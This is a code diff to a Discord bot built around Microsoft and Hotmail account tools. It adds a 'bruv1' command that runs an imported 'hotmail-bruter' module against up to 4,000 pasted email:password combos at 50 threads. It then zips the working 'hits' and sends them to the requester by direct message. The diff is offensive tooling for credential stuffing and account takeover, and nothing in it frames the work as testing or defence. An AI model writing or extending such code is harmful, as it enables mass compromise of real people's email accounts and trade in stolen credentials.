@@ -17,6 +17,7 @@ const { checkRefundAccounts } = require("./utils/microsoft-refund");
 const { checkInboxAccounts, getServiceCount } = require("./utils/microsoft-inbox");
 const { runCountrySort } = require("./utils/microsoft-countrysort");
 const { changePasswords } = require("./utils/microsoft-changer");
+const { runBruter } = require("./utils/hotmail-bruter");
 const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats } = require("./utils/proxy-manager");
 const blacklist = require("./utils/blacklist");
 const { setWlids, getWlids, getWlidCount } = require("./utils/wlid-store");
@@ -40,6 +41,8 @@ const {
   countrySortResultsEmbed,
   changerProgressEmbed,
   changerFinalEmbed,
+  bruterProgressEmbed,
+  bruterFinalEmbed,
   rewardsResultsEmbed,
   refundProgressEmbed,
   refundResultsEmbed,
@@ -95,7 +98,7 @@ function isOwner(userId) {
 // ── Channel enforcement ──────────────────────────────────────
 
 const PULLER_CHECKER_CMDS = new Set(["pull", "promopuller", "check", "checker", "claim"]);
-const INBOX_NORMAL_CMDS = new Set(["inboxaio", "countrysort", "rewards", "help", "stats", "wlidset", "refund", "netflix", "steam", "xboxchk", "aio", "change"]);
+const INBOX_NORMAL_CMDS = new Set(["inboxaio", "countrysort", "rewards", "help", "stats", "wlidset", "refund", "netflix", "steam", "xboxchk", "aio", "change", "bruv1"]);
 
 function getRequiredChannel(cmd) {
   if (PULLER_CHECKER_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_PULLER;
@@ -1085,6 +1088,86 @@ async function handleChange(respond, userId, newPassword, accountsRaw, accountsF
     }
 
     statsManager.record(userId, "change", changed.length);
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
+  } finally {
+    activeAborts.delete(userId);
+    limiter.release(userId);
+  }
+}
+
+// ── Hotmail Bruter ──────────────────────────────────────────
+
+async function handleBruv1(respond, userId, accountsRaw, accountsFile, threads = 50, dmUser = null) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
+
+  const acquire = limiter.acquire(userId, "bruv1");
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a task running." : "Bot is at max capacity. Try again later.")] });
+
+  const accounts = await gatherCombos(accountsRaw, accountsFile);
+  if (!accounts.length) { limiter.release(userId); return respond({ embeds: [errorEmbed("No valid email:password combos found.")] }); }
+  if (accounts.length > 4000) { limiter.release(userId); return respond({ embeds: [errorEmbed("Max 4,000 lines.")] }); }
+
+  const controller = new AbortController();
+  activeAborts.set(userId, controller);
+
+  try {
+    const startTime = Date.now();
+    const msg = await respond({
+      embeds: [bruterProgressEmbed({ completed: 0, total: accounts.length, hits: 0, bad: 0, elapsed: 0, username: dmUser?.username })],
+    });
+
+    let hitCount = 0, badCount = 0;
+
+    const results = await runBruter(
+      accounts, threads,
+      (r, done, total) => {
+        if (r?.status === "hit") hitCount++; else badCount++;
+        if (done % 5 === 0 || done === total) {
+          updateProgress(msg, bruterProgressEmbed({
+            completed: done, total, hits: hitCount, bad: badCount,
+            elapsed: Date.now() - startTime,
+            latestAccount: r?.email,
+            latestStatus: r?.status,
+            username: dmUser?.username,
+          }));
+        }
+      },
+      controller.signal,
+    );
+
+    const elapsed = Date.now() - startTime;
+    const hits = results.filter((r) => r.status === "hit");
+    const bads = results.filter((r) => r.status !== "hit");
+
+    const zipEntries = [];
+    if (hits.length > 0) {
+      zipEntries.push({ name: "hits.txt", content: hits.map((r) => `${r.email}:${r.password}`).join("\n") });
+    }
+    if (bads.length > 0) {
+      zipEntries.push({ name: "bad.txt", content: bads.map((r) => `${r.email}:${r.password}`).join("\n") });
+    }
+
+    const embed = bruterFinalEmbed({
+      total: results.length, hits: hits.length, bad: bads.length,
+      elapsed, dmSent: !!dmUser, username: dmUser?.username,
+    });
+
+    if (dmUser && zipEntries.length > 0) {
+      const { buildZipBuffer } = require("./utils/zip-builder");
+      const zipBuffer = buildZipBuffer(zipEntries);
+      const zipFile = new AttachmentBuilder(zipBuffer, { name: "bruter_results.zip" });
+      try {
+        await dmUser.send({ embeds: [embed], files: [zipFile] });
+        await msg.edit({ embeds: [infoEmbed("Hotmail Bruter Complete", `Hits: ${hits.length}/${results.length}. Results sent to your DMs.`)], components: [] });
+      } catch {
+        await msg.edit({ embeds: [embed], files: [zipFile] });
+      }
+    } else {
+      await msg.edit({ embeds: [embed] });
+    }
+
+    statsManager.record(userId, "bruv1", hits.length);
   } catch (err) {
     await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
   } finally {
